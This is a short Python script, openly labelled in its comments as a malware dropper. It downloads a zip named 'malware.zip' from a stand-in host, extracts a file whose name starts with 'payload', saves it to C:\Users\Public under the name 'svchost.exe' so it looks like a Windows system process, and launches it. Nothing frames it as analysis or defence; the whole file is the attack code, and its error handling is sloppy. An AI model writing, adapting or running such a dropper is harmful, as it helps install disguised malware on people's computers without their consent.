import requests
import os
from zipfile import ZipFile

# Step 1: Downloading the payload from URL
url = "https://example.com/malware.zip"
response = requests.get(url)

# Save it to a temporary location
temp_file = "temp_malware.zip"
with open(temp_file, 'wb') as file:
    file.write(response.content)

# Step 2: Extracting the payload from downloaded zip file
malware_zip = ZipFile(temp_file)
files = malware_zip.namelist()
payload_file = [file for file in files if file.startswith("payload")]

if len(payload_file) == 0:
    print("No payload found inside the zip.")
else:
    payload_file = malware_zip.open(payload_file[0])
    payload_content = payload_file.read()

# Step 3: Saving the payload to system folder
system_folder = "C:\\Users\\Public"
payload_name = "svchost.exe"
payload_path = os.path.join(system_folder, payload_name)

with open(payload_path, 'wb') as file:
    file.write(payload_content)

# Step 4: Launching the downloaded file as new process and then terminate dropper
os.system("start " + payload_name)
